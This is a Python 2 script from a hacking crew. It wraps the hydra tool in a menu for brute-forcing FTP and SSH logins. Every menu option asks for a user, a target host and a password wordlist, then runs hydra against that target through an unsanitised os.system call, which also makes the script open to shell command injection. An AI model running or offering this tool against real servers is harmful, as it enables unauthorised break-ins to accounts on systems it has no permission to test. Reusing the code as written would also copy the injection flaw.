#!/usr/bin/python2
# bruteforce 
# coded by 3xploit [LNX#.CREW /https://www.lnx-crew.zone.id]
# code perkembangan dari hydra
# sudo apt install hydra / apt-get install hydra
# input$ python2 brute.py
 

import sys, os, time

# Set color 
R = '\033[31m' # Red 
N = '\033[1;37m' # White 
G = '\033[32m' # Green 
O = '\033[0;33m' # Orange 
B = '\033[1;34m' #Blue

def restart_program():
   python = sys.executable
   os.execl(python, python, * sys.argv)
   curdir = os.getcwd()

os.system("clear")
print""+G+"      ___    ___    _   _  _____  ___    ___    _____  ___    ___    ___ "  
print"     (  _`\ |  _`\ ( ) ( )(_   _)(  _`\ (  _`\ (  _  )|  _`\ (  _`\ (  _`\ "
print"     | (_) )| (_) )| | | |  | |  | (_(_)| (_(_)| ( ) || (_) )| ( (_)| (_(_)"
print"     |  _ <'| ,  / | | | |  | |  |  _)_ |  _)  | | | || ,  / | |  _ |  _)_ "
print"     | (_) )| |\ \ | (_) |  | |  | (_( )| |    | (_) || |\ \ | (_( )| (_( )"
print"     (____/'(_) (_)(_____)  (_)  (____/'(R_)    (_____)(_) (_)(____/'(____/'"+R+" "                                                                                                     
print"                                                 (Bruteforce:_v0.1.0)"
print"                                         >https://www.lnx-crew.zone.id"
print""+B+"Coded_By:3xploit "
print" [+]LNX#.CREW[+] [+]IST[+]"+N+""
print
print "[01] FTP Brute Force  "
print "[02] SSH Brute Force  "
print
print "[00] Exit"
print ""+R+""
print
hackerindonesia = raw_input("[+]~input: ")

if hackerindonesia == '01' or hackerindonesia == '1':
  print
  user = raw_input("[*] User : ")
  iphost = raw_input("[*] IP/Hostname : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
  sys.exit()
  
elif hackerindonesia == '02' or hackerindonesia == '2':
   print
   user = raw_input("[*] User : ")
   word = raw_input("[*] Wordlist : ")
   iphost = raw_input("[*] IP/Hostname : ")
   os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
   sys.exit()
   
elif hackerindonesia == '00' or hackerindonesia == '0':
	print "\n[!] Exit Progam!!..."
	sys.exit()
	
else:
	print "\n[!] ERROR : Wrong Input"
	time.sleep(1)
	restart_program()